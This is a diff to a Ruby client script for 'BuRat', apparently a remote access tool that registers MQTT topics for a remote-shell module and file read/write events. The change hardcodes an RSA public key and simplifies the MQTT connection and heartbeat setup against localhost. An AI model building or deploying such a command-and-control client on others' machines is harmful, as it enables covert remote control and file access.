@@ -3,7 +3,6 @@ require_relative 'burat'
 burat = BuRat.new
 
 burat.add_topics({
-	:key									 	=> "/bu/public_key",
 	:nil										=> "/bu/nil",
 	:bushi									=> "/bu/bushi/BURAT",
 	:remoteshell						=> "/bu/bushi/BURAT/bushido/remoteshell/+",
@@ -23,27 +22,17 @@ burat.add_topics({
 	:filerw_evt_error				=> "/bu/bushi/BURAT/bushido/filerw/+/evt/error"
 })
 
-burat.internals[:mqtt][:key].on_message do |message|
-	key = message.payload
-	burat.internals[:rsa].config({
-		:encoded_key => key
-	})
-	burat.internals[:mqtt][:key].disconnect
-end
-
-burat.internals[:mqtt][:key].host = 'localhost'
-burat.internals[:mqtt][:key].port = 1883
-burat.internals[:mqtt][:key].persistent = true
-burat.internals[:mqtt][:key].blocking = true
-burat.internals[:mqtt][:key].reconnect_limit = 3
-burat.internals[:mqtt][:key].reconnect_delay = 60
-burat.internals[:mqtt][:key].connect()
-burat.internals[:mqtt][:key].subscribe([burat.topics[:key], 2])
-
-while burat.internals[:mqtt][:key].connected?
-	burat.internals[:mqtt][:key].loop_read
-	burat.internals[:mqtt][:key].loop_write
-end
+burat.internals[:rsa].config({
+:encoded_key => '-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3UEh+HOkcBDCuJYRNgRb
+GPRUCWZJp4PI2+X21AHPrK7EZ49eH2SNaKm6qivTzcv/+AQxNYzBZVU1AFKqSmKT
+pueIIK6qEuh5GTnYsYiTXhNDdNLCFfXLDsc/adEAylSJg7NrBTf9NvanqcSPl/kC
+ARNKGkusuh560tVI8NHIsPjwuN3oC49xbFSiyJfaoGa3RJijsMIgPM5zgS2DyJWH
+6DxgX7/TbmXUVFkyPyfYhAizsuZijosmSI7SWIbQ7NaiJWdkiFp5lDRIjI5chHnY
+CrP1DfupsO/t4iIRmwvB34WVjkJ7lPpZmpcsbLlVugNYJzT7jfunncMoFJ74dcJ+
+5QIDAQAB
+-----END PUBLIC KEY-----'
+})
 
 burat.internals[:digest].config({
 	:digest => 'md5'
@@ -211,33 +200,33 @@ burat.bushido[:filerw].on :error do |id, error|
 	burat.publish(id, :filerw_evt_error, packet, false, 2)
 end
 
-burat.internals[:mqtt][:burat].on_connack do
+burat.internals[:mqtt].on_connack do
 	burat.status = :online
 	packet = burat.profile
-	burat.internals[:mqtt][:burat].publish(burat.topics[:bushi], packet, true, 2)
+	burat.internals[:mqtt].publish(burat.topics[:bushi], packet, true, 2)
 	Thread.new {
 		loop do
-			burat.internals[:mqtt][:burat].publish(burat.topics[:nil], nil, false, 2)
-			sleep burat.internals[:mqtt][:burat].keep_alive
+			burat.internals[:mqtt].publish(burat.topics[:nil], nil, false, 2)
+			sleep burat.internals[:mqtt].keep_alive
 		end
 	}
 end
 
-burat.internals[:mqtt][:burat].host = 'localhost'
-burat.internals[:mqtt][:burat].port = 1883
-burat.internals[:mqtt][:burat].persistent = true
-burat.internals[:mqtt][:burat].blocking = true
-burat.internals[:mqtt][:burat].reconnect_limit = 3
-burat.internals[:mqtt][:burat].reconnect_delay = 60
-burat.internals[:mqtt][:burat].will_topic = burat.topics[:bushi]
-burat.internals[:mqtt][:burat].will_payload = burat.profile
-burat.internals[:mqtt][:burat].will_qos = 2
-burat.internals[:mqtt][:burat].will_retain = true
+burat.internals[:mqtt].host = 'localhost'
+burat.internals[:mqtt].port = 1883
+burat.internals[:mqtt].persistent = true
+burat.internals[:mqtt].blocking = true
+burat.internals[:mqtt].reconnect_limit = 3
+burat.internals[:mqtt].reconnect_delay = 60
+burat.internals[:mqtt].will_topic = burat.topics[:bushi]
+burat.internals[:mqtt].will_payload = burat.profile
+burat.internals[:mqtt].will_qos = 2
+burat.internals[:mqtt].will_retain = true
 
 loop do
 	begin
-		burat.internals[:mqtt][:burat].loop_read
-		burat.internals[:mqtt][:burat].loop_write
+		burat.internals[:mqtt].loop_read
+		burat.internals[:mqtt].loop_write
 	rescue StandardError => error
 		puts error
 		burat.connect()
